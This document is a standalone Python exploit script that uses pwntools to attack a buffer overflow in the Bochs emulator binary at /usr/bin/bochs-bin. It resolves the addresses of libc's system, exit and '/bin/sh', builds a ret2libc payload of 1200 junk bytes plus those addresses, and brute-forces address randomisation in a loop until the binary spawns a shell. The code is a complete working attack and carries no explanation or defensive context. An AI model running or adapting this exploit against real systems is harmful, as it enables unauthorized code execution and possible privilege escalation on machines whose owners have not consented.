import os
import struct
import subprocess
from pwn import *

def libc_base_random(command):
	start = command.find("(")
	finish = command.find(")")
	ret = command[start+1:finish]
	return int(ret,16)			# Random libc base address
			
def elf_find(command):
	start = command.find("> ")
	finish = command.find(" (")
	ret = command[start+2:finish]
	return ret			

if __name__ == '__main__':

	filename = "/usr/bin/bochs-bin"
	offset = 1200
	com1 = "ldd " + filename + " |grep libc.so"
	com2 = "bochs-bin" 

	command = os.popen(com1).read()	
	libc_base = libc_base_random(command)
	e = ELF(elf_find(command))		# Example: '/lib/i386-linux-gnu/libc.so.6'

	off_system = e.symbols['system']	# offset of system
	off_exit = e.symbols['exit']		# offset of exit
	off_binsh = e.search("/bin/sh").next()	# offset of /bin/sh

	system_addr = libc_base + off_system
	exit_addr = libc_base + off_exit
	binsh_addr = libc_base + off_binsh

	# Ret2libc formula: junk + system address + exit address + /bin/sh

	buf = ""
	buf += "A"*offset			# junk
	buf += struct.pack("<I", system_addr)	# system address
	buf += struct.pack("<I", exit_addr)	# exit address
	buf += struct.pack("<I", binsh_addr)	# /bin/sh address

	while(1):				# Brute Force
		res = subprocess.call([com2, buf])    
		if not res:
			exit(0)


